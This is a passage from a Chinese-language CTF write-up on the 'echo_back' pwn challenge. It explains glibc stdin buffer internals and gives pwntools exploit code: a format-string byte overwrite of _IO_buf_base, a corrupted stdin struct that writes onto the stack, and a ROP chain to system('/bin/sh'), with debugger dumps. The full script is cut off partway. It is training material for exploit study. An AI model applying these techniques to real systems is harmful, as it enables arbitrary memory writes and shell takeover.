      <span class="token function">_IO_doallocbuf</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>  
    <span class="token punctuation">}</span>  

  <span class="token comment" spellcheck="true">/* FIXME This can/should be moved to genops ?? */</span>  
  <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_flags <span class="token operator">&amp;</span> <span class="token punctuation">(</span>_IO_LINE_BUF<span class="token operator">|</span>_IO_UNBUFFERED<span class="token punctuation">)</span><span class="token punctuation">)</span>  
    <span class="token punctuation">{</span>  
      <span class="token comment" spellcheck="true">/* We used to flush all line-buffered stream.  This really isn't 
     required by any standard.  My recollection is that 
     traditional Unix systems did this for stdout.  stderr better 
     not be line buffered.  So we do just that here 
     explicitly.  --drepper */</span>  
      <span class="token function">_IO_acquire_lock</span> <span class="token punctuation">(</span>_IO_stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>  

      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>_IO_stdout<span class="token operator">-></span>_flags <span class="token operator">&amp;</span> <span class="token punctuation">(</span>_IO_LINKED <span class="token operator">|</span> _IO_NO_WRITES <span class="token operator">|</span> _IO_LINE_BUF<span class="token punctuation">)</span><span class="token punctuation">)</span>  
      <span class="token operator">==</span> <span class="token punctuation">(</span>_IO_LINKED <span class="token operator">|</span> _IO_LINE_BUF<span class="token punctuation">)</span><span class="token punctuation">)</span>  
    <span class="token function">_IO_OVERFLOW</span> <span class="token punctuation">(</span>_IO_stdout<span class="token punctuation">,</span> <span class="token constant">EOF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  

      <span class="token function">_IO_release_lock</span> <span class="token punctuation">(</span>_IO_stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>  
    <span class="token punctuation">}</span>  

  <span class="token function">_IO_switch_to_get_mode</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>  

  <span class="token comment" spellcheck="true">/* This is very tricky. We have to adjust those 
     pointers before we call _IO_SYSREAD () since 
     we may longjump () out while waiting for 
     input. Those pointers may be screwed up. H.J. */</span>  
  fp<span class="token operator">-></span>_IO_read_base <span class="token operator">=</span> fp<span class="token operator">-></span>_IO_read_ptr <span class="token operator">=</span> fp<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">;</span>  
  fp<span class="token operator">-></span>_IO_read_end <span class="token operator">=</span> fp<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//重新设置新的 _IO_buf_base</span>
  fp<span class="token operator">-></span>_IO_write_base <span class="token operator">=</span> fp<span class="token operator">-></span>_IO_write_ptr <span class="token operator">=</span> fp<span class="token operator">-></span>_IO_write_end  
    <span class="token operator">=</span> fp<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">;</span>  
  <span class="token comment" spellcheck="true">//--------------------------------------</span>
  count <span class="token operator">=</span> <span class="token function">_IO_SYSREAD</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> fp<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">,</span>  <span class="token comment" spellcheck="true">//系统向_IO_buf_base指向的缓冲区写入读取的数据</span>
          fp<span class="token operator">-></span>_IO_buf_end <span class="token operator">-</span> fp<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//写入长度:fp->_IO_buf_end - fp->_IO_buf_base</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span>count <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span>  
    <span class="token punctuation">{</span>  
      <span class="token keyword">if</span> <span class="token punctuation">(</span>count <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>  
    fp<span class="token operator">-></span>_flags <span class="token operator">|</span><span class="token operator">=</span> _IO_EOF_SEEN<span class="token punctuation">;</span>  
      <span class="token keyword">else</span>  
    fp<span class="token operator">-></span>_flags <span class="token operator">|</span><span class="token operator">=</span> _IO_ERR_SEEN<span class="token punctuation">,</span> count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  
  <span class="token punctuation">}</span>  
  fp<span class="token operator">-></span>_IO_read_end <span class="token operator">+</span><span class="token operator">=</span> count<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//使 _IO_read_end指针向后移动 </span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>count <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>  
    <span class="token punctuation">{</span>  
      <span class="token comment" spellcheck="true">/* If a stream is read to EOF, the calling application may switch active 
     handles.  As a result, our offset cache would no longer be valid, so 
     unset it.  */</span>  
      fp<span class="token operator">-></span>_offset <span class="token operator">=</span> _IO_pos_BAD<span class="token punctuation">;</span>  
      <span class="token keyword">return</span> <span class="token constant">EOF</span><span class="token punctuation">;</span>  
    <span class="token punctuation">}</span>  
  <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_offset <span class="token operator">!=</span> _IO_pos_BAD<span class="token punctuation">)</span>  
    <span class="token function">_IO_pos_adjust</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_offset<span class="token punctuation">,</span> count<span class="token punctuation">)</span><span class="token punctuation">;</span>  
  <span class="token keyword">return</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> fp<span class="token operator">-></span>_IO_read_ptr<span class="token punctuation">;</span>  
<span class="token punctuation">}</span></code></pre>
<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>IO_SYSREAD系统调用，向fp-&gt;_IO_buf_base处写入读取的数据，并且长度为 fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base</p>
<p>要是能够修改_IO_buf_base和_IO_buf_end 那么就可以实现任意位置和想要的长度</p>
<p>首先需要定位到_IO_2_1_stdin_结构体在内存中的位置，然后再定位到_IO_buf_base 的位置，_IO_buf_base位于结构体中的第8个，所以，它的_IO_buf_base_addr = _IO_buf_base + 0x8 * 7 (注意结构体对齐,int占用内存8字节,所以为 0x8 * 7 而不是 0x8 * 6 + 4)</p>
<pre class=" language-python"><code class="language-python">    <span class="token comment" spellcheck="true">#leaking_IO_buf_base</span>
    _IO_2_1_stdin_ <span class="token operator">=</span> libc_base <span class="token operator">+</span> lib<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stdin_'</span><span class="token punctuation">]</span>
    _IO_buf_base <span class="token operator">=</span> _IO_2_1_stdin_ <span class="token operator">+</span> <span class="token number">0x8</span> <span class="token operator">*</span> <span class="token number">7</span>
    li<span class="token punctuation">(</span><span class="token string">'_IO_buf_base'</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>_IO_buf_base<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
<p>来看看_IO_buf_base的值</p>
<pre><code>0x7ffb6a2b08e0 &lt;_IO_2_1_stdin_&gt;:    0x00000000fbad208b    0x00007ffb6a2b0964
0x7ffb6a2b08f0 &lt;_IO_2_1_stdin_+16&gt;:    0x00007ffb6a2b0964    0x00007ffb6a2b0963
0x7ffb6a2b0900 &lt;_IO_2_1_stdin_+32&gt;:    0x00007ffb6a2b0963    0x00007ffb6a2b0963
0x7ffb6a2b0910 &lt;_IO_2_1_stdin_+48&gt;:    0x00007ffb6a2b0963    0x00007ffb6a2b0963 //IO_buf_base
0x7ffb6a2b0920 &lt;_IO_2_1_stdin_+64&gt;:    0x00007ffb6a2b0964    0x0000000000000000 //IO_buf_end
0x7ffb6a2b0930 &lt;_IO_2_1_stdin_+80&gt;:    0x0000000000000000    0x0000000000000000
0x7ffb6a2b0940 &lt;_IO_2_1_stdin_+96&gt;:    0x0000000000000000    0x0000000000000000
0x7ffb6a2b0950 &lt;_IO_2_1_stdin_+112&gt;:    0x0000000000000000    0xffffffffffffffff
0x7ffb6a2b0960 &lt;_IO_2_1_stdin_+128&gt;:    0x000000000a000000    0x00007ffb6a2b2790
0x7ffb6a2b0970 &lt;_IO_2_1_stdin_+144&gt;:    0xffffffffffffffff    0x0000000000000000
0x7ffb6a2b0980 &lt;_IO_2_1_stdin_+160&gt;:    0x00007ffb6a2b09c0    0x0000000000000000
0x7ffb6a2b0990 &lt;_IO_2_1_stdin_+176&gt;:    0x0000000000000000    0x0000000000000000
0x7ffb6a2b09a0 &lt;_IO_2_1_stdin_+192&gt;:    0x00000000ffffffff    0x0000000000000000
0x7ffb6a2b09b0 &lt;_IO_2_1_stdin_+208&gt;:    0x0000000000000000    0x00007ffb6a2af6e0</code></pre>
<p>先是stdin的位置,当前位于0x7ffb6a2b08e0</p>
<p>然后是_IO_buf_base，它位于0x7ffb6a2b08e0 + 0x8 * 7 = 0x7ffb6a2b0918 ，它的值为0x00007ffb6a2b0963 ， 并且要知道，它的值相对_IO_2_1_stdin_的地址总是不变的，假如我们把_IO_buf_base的低一字节覆盖为0，那么他就变成了0x00007ffb6a2b0900 ，也就是0x7ffb6a2b08e0 + 0x8 * 4处，跑到了结构体内部去了，是结构体中的第5个数据处，也是_IO_write_base处，并且由于_IO_buf_end没变，那么我们可以从0x00007ffb6a2b0900处向后输入0x64-0x00 = 0x64个字符，那么就能把_IO_buf_base和_IO_buf_end都覆盖成关键地址，就能绕过7个字符的输入限制,且可以实现write anything anywhere</p>
<p>先来覆盖_IO_buf_base的低1字节为0</p>
<pre class=" language-python"><code class="language-python">    <span class="token comment" spellcheck="true">#modify _IO_buf_base</span>
    sla<span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p <span class="token operator">=</span> p64<span class="token punctuation">(</span>_IO_buf_base<span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p <span class="token operator">=</span> <span class="token string">'%16$hhn'</span> <span class="token comment" spellcheck="true">#不打印,即个数为0</span>
    sl<span class="token punctuation">(</span>p<span class="token punctuation">)</span></code></pre>
<p>接下来，就可以覆盖结构体里的一些数据了</p>
<p>对于_IO_buf_base之前的数据(_IO_write_base_IO_write_ptr, _IO_write_end)，最好原样的放回，不然不知道会出现什么问题，经过调试，发现它们的值都是0x83 + _IO_2_1_stdin_addr，然后接下来，覆盖_IO_buf_base和_IO_buf_end，将它设置为堆栈中的&amp;main ret, 然后即可实现写入数据时,就会向堆栈中写入数据,前提还需满足一些条件.</p>
<p>于是，payload</p>
<pre class=" language-python"><code class="language-python">    <span class="token comment" spellcheck="true">#build payload to modify _IO_2_1_stdin struct</span>
    p <span class="token operator">=</span> p64<span class="token punctuation">(</span>_IO_2_1_stdin_ <span class="token operator">+</span> <span class="token number">0x83</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">3</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>main_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>main_ret <span class="token operator">+</span> <span class="token number">0x8</span> <span class="token operator">*</span> <span class="token number">3</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#length:</span>
    sl<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span></code></pre>
<p>在length:后面发送payload, 因为这个地方用到了scanf</p>
<p>现在，得绕过一个判断，这样调用scanf 输入数据时，才会往缓冲区写入输入的数据</p>
<pre class=" language-c"><code class="language-c"> <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_IO_read_ptr <span class="token operator">&lt;</span> fp<span class="token operator">-></span>_IO_read_end<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//判断是否已经读完, 想要能写入缓冲数据,就得把让ptr >= end,这样才能使新的数据重新读入到缓冲区里 </span>
    <span class="token keyword">return</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> fp<span class="token operator">-></span>_IO_read_ptr<span class="token punctuation">;</span>  </code></pre>
<p>之前，覆盖结构体数据时，后面执行了这一步，使得 fp-&gt;_IO_read_end += count 相当于fp-&gt;_IO_read_end += len(p)</p>
<pre class=" language-c"><code class="language-c">fp<span class="token operator">-></span>_IO_read_end <span class="token operator">=</span> fp<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//重新设置新的 _IO_buf_base</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>          <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
count <span class="token operator">=</span> <span class="token function">_IO_SYSREAD</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> fp<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">,</span>  <span class="token comment" spellcheck="true">//系统向_IO_buf_base指向的缓冲区写入读取的数据</span>
          fp<span class="token operator">-></span>_IO_buf_end <span class="token operator">-</span> fp<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//写入长度:fp->_IO_buf_end - fp->_IO_buf_base</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>          <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
fp<span class="token operator">-></span>_IO_read_end <span class="token operator">+</span><span class="token operator">=</span> count<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//使 _IO_read_end指针向后移动</span></code></pre>
<p>下面为输入之前的_IO_2_1_stdin_</p>
<pre><code>0x7fa95326b8e0 &lt;_IO_2_1_stdin_&gt;:    0x00000000fbad208b    0x00007fa95326b901 //_IO_read_ptr
                                    //IO_read_end
0x7fa95326b8f0 &lt;_IO_2_1_stdin_+16&gt;:    0x00007fa95326b928    0x00007fa95326b900
0x7fa95326b900 &lt;_IO_2_1_stdin_+32&gt;:    0x00007fa95326b963    0x00007fa95326b963
0x7fa95326b910 &lt;_IO_2_1_stdin_+48&gt;:    0x00007fa95326b963    0x00007ffddf79fbe8
0x7fa95326b920 &lt;_IO_2_1_stdin_+64&gt;:    0x00007ffddf79fc00    0x0000000000000000</code></pre>
<p>而 getchar() 的作用是使fp-&gt;_IO_read_ptr + 1</p>
<p>由于在覆盖结构体后，scanf的后面有一个getchar，执行了一次，所以还需要调用len(p)-1次getchar()，使_IO_read_ptr ==  PIO_read_end</p>
<pre class=" language-python"><code class="language-python">    <span class="token comment" spellcheck="true">#call getchar() make fp->_IO_read_ptr == fp->_IO_read_end</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        sla<span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        sla<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> <span class="token string">','</span><span class="token punctuation">)</span>
        sl<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span>    </code></pre>
<p>调用 len(p) - 1次getchar()后, _IO_2_1_stdin_ 如下</p>
<pre><code>pwndbg&gt; x /40gx &amp;_IO_2_1_stdin_
0x7f1a9a51f8e0 &lt;_IO_2_1_stdin_&gt;:    0x00000000fbad208b    0x00007f1a9a51f928 //_IO_read_ptr
                                    //IO_read_end
0x7f1a9a51f8f0 &lt;_IO_2_1_stdin_+16&gt;:    0x00007f1a9a51f928    0x00007f1a9a51f900
0x7f1a9a51f900 &lt;_IO_2_1_stdin_+32&gt;:    0x00007f1a9a51f963    0x00007f1a9a51f963
0x7f1a9a51f910 &lt;_IO_2_1_stdin_+48&gt;:    0x00007f1a9a51f963    0x00007fff14080e88
0x7f1a9a51f920 &lt;_IO_2_1_stdin_+64&gt;:    0x00007fff14080ea0    0x0000000000000000
0x7f1a9a51f930 &lt;_IO_2_1_stdin_+80&gt;:    0x0000000000000000    0x0000000000000000
</code></pre>
<h3 id="构造rop链"><a href="#构造rop链" class="headerlink" title="构造rop链"></a>构造rop链</h3><p>然后再次输入的时候,输入的数据就会在stack中了,现在就可以构造rop链.</p>
<pre class=" language-python"><code class="language-python">    <span class="token comment" spellcheck="true">#build rop chail</span>
    sla<span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>sh_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#length:</span>
    sl<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>    </code></pre>
<p>下面为输入修改后的堆栈</p>
<pre><code>pwndbg&gt; stack 50
00:0000│ rsp  0x7fff92ceeed8 —▸ 0x55c9b5337ad4 ◂— movzx  eax, byte ptr [rbp - 0x10]
01:0008│ rsi  0x7fff92ceeee0 ◂— 0x0
02:0010│      0x7fff92ceeee8 ◂— 0x4a74f6baf7ec8d00
03:0018│ rbp  0x7fff92ceeef0 —▸ 0x7fff92ceef00 —▸ 0x7fff92ceef30 —▸ 0x55c9b5337d30 ◂— push   r15
04:0020│      0x7fff92ceeef8 —▸ 0x55c9b5337b43 ◂— pop    rbp
05:0028│      0x7fff92ceef00 —▸ 0x7fff92ceef30 —▸ 0x55c9b5337d30 ◂— push   r15
06:0030│      0x7fff92ceef08 —▸ 0x55c9b5337ccd ◂— mov    dword ptr [rbp - 0x14], eax
07:0038│      0x7fff92ceef10 —▸ 0x55c9b5337d30 ◂— push   r15
08:0040│      0x7fff92ceef18 ◂— 0xffffffda00000001
09:0048│      0x7fff92ceef20 —▸ 0x7f53670f8918 (_IO_2_1_stdin_+56) —▸ 0x7fff92ceef38 —▸ 0x55c9b5337d93 ◂— pop    rdi
0a:0050│      0x7fff92ceef28 ◂— 0x4a74f6baf7ec8d00
0b:0058│      0x7fff92ceef30 —▸ 0x55c9b5337d30 ◂— push   r15
0c:0060│      0x7fff92ceef38 —▸ 0x55c9b5337d93 ◂— pop    rdi //修改为pop_rdi _ret
0d:0068│      0x7fff92ceef40 —▸ 0x7f5366ec0d57 ◂— 0x68732f6e69622f /* &#39;/bin/sh&#39; */
0e:0070│      0x7fff92ceef48 —▸ 0x7f5366d79390 (system) ◂— test   rdi, rdi
</code></pre>
<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>只需使main函数ret即可</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#get shell</span>
    sla<span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre>
<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
<span class="token comment" spellcheck="true">#-*- coding:utf-8 -*-</span>

<span class="token comment" spellcheck="true"># Author: I0gan</span>
<span class="token comment" spellcheck="true"># Team  : D0g3</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment" spellcheck="true">#from LibcSearcher import LibcSearcher</span>

<span class="token comment" spellcheck="true">#context.log_level='debug'</span>
<span class="token comment" spellcheck="true">#context.terminal = ['konsole', '-x', 'bash', 'c']</span>
<span class="token comment" spellcheck="true">#context.terminal = 'konsole'</span>
<span class="token comment" spellcheck="true">#context(arch = 'i386', os = 'linux', log_level='debug')</span>
context<span class="token punctuation">(</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span> os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>

exeFile  <span class="token operator">=</span> <span class="token string">"echo_back"</span>
libFile  <span class="token operator">=</span> <span class="token string">"./libc.so.6"</span>

remoteIp <span class="token operator">=</span> <span class="token string">"111.198.29.45"</span>
remotePort <span class="token operator">=</span> <span class="token number">54180</span>

LOCAL <span class="token operator">=</span> <span class="token number">1</span>
LIBC  <span class="token operator">=</span> <span class="token number">1</span>

r   <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
ra  <span class="token operator">=</span>  <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
rl  <span class="token operator">=</span>  <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
ru  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">,</span> drop <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
sl  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
sla <span class="token operator">=</span>  <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
ia  <span class="token operator">=</span>  <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
c   <span class="token operator">=</span>  <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
pd32  <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> p32<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#python3 not surport str + bytes</span>
pd64  <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> p64<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
li    <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
db    <span class="token operator">=</span> <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#--------------------------Func-----------------------------</span>
<span class="token keyword">def</span> <span class="token function">eb</span><span class="token punctuation">(</span>length<span class="token punctuation">,</span> text<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sl<span class="token punctuation">(</span>text<span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#--------------------------Exploit--------------------------</span>
<span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>

    <span class="token comment" spellcheck="true"># leaking libc base</span>
    sla<span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p <span class="token operator">=</span> <span class="token string">'%19$p'</span>
    sl<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">)</span>
    libc_start_main <span class="token operator">=</span> int<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">240</span>
    libc_base <span class="token operator">=</span> libc_start_main <span class="token operator">-</span> lib<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span>
    li<span class="token punctuation">(</span><span class="token string">'libc_base:'</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sys_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> lib<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
    sh_addr  <span class="token operator">=</span> libc_base <span class="token operator">+</span> lib<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true"># leaking elf base</span>
    sla<span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p <span class="token operator">=</span> <span class="token string">'%14$p'</span>
    sl<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">)</span>
    elf_base <span class="token operator">=</span> int<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0xD30</span>
    main_addr <span class="token operator">=</span> elf_base <span class="token operator">+</span> <span class="token number">0xC6C</span>
    pop_rdi_ret <span class="token operator">=</span> elf_base <span class="token operator">+</span> <span class="token number">0xd93</span>
    li<span class="token punctuation">(</span><span class="token string">'elf_base:'</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>elf_base<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true">#leaking main ret in stack</span>
    sla<span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p <span class="token operator">=</span> <span class="token string">'%12$p'</span>
    sl<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">)</span>
    main_ret <span class="token operator">=</span> int<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x8</span>


    <span class="token comment" spellcheck="true">#leaking IO_buf_base</span>
    _IO_2_1_stdin_ <span class="token operator">=</span> libc_base <span class="token operator">+</span> lib<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stdin_'</span><span class="token punctuation">]</span>
    _IO_buf_base <span class="token operator">=</span> _IO_2_1_stdin_ <span class="token operator">+</span> <span class="token number">0x8</span> <span class="token operator">*</span> <span class="token number">7</span>
    li<span class="token punctuation">(</span><span class="token string">'_IO_buf_base'</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>_IO_buf_base<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true">#modify _IO_buf_base</span>
